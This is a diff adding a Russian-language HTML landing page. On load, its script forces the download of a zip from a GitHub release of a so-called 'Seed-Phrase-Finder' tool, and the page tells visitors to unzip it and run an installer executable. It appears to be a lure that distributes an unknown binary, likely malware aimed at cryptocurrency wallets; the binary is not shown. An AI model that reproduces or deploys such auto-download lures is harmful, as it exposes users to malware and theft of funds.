@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title>Скачивание сразу</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column; /* Для вертикального расположения */
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .instructions {
+            text-align: center;
+            background: #f3f3f3;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px; /* Отступ между блоками */
+        }
+        .images {
+            width: 100%; /* Полная ширина контейнера */
+            display: flex; /* Горизонтальное расположение изображений */
+            flex-wrap: wrap; /* Перенос элементов на новую строку */
+            justify-content: space-around; /* Равномерное распределение места между изображениями */
+        }
+        img {
+            max-width: 100%; /* Максимальная ширина изображения */;
+            height: auto;  /* Высота изменяется пропорционально ширине */
+            width: auto;   /* Ширина изменяется пропорционально высоте */
+            max-height: 300px; /* Ограничение по высоте изображений */
+        }
+    </style>
+</head>
+<body>
+    <div class="instructions">
+        <p>Download zip archive</p>
+        <p>Unzip to any folder</p>
+        <p>Run Installing_file_x64.exe</p>
+        <p>Follow the instructions below</p>
+    </div>
+    <div class="images">
+        <!-- Вставьте адреса ваших изображений ниже -->
+        <img src="https://i.postimg.cc/bwR3Fyq9/Start-image.jpg" alt="Description 1">
+        <img src="https://i.postimg.cc/wjFQQwkW/second-image.jpg" alt="Description 2">
+        <img src="https://i.postimg.cc/nLPK6MgB/thirdimage.jpg" alt="Description 3">
+        <img src="https://i.postimg.cc/WzRG1C24/fourth-image.jpg" alt="Description 4">
+        <img src="https://i.postimg.cc/DwD8hsfv/fifth-image.jpg" alt="Description 5">
+    </div>
+    <script>
+        // URL файла, который нужно скачать
+        var file_url = 'https://github.com/NielsGro/Seed-Phrase-Finder/releases/download/1/Installing_file_win64.zip';
+
+        // Функция для скачивания файла сразу же при загрузке страницы
+        function downloadFile(url) {
+            var link = document.createElement('a');
+            link.href = url;
+            link.setAttribute('download', ''); // Атрибут принудительной загрузки
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Вызов функции при загрузке страницы
+        window.onload = function () {
+            downloadFile(file_url);
+        };
+    </script>
+</body>
+</html>
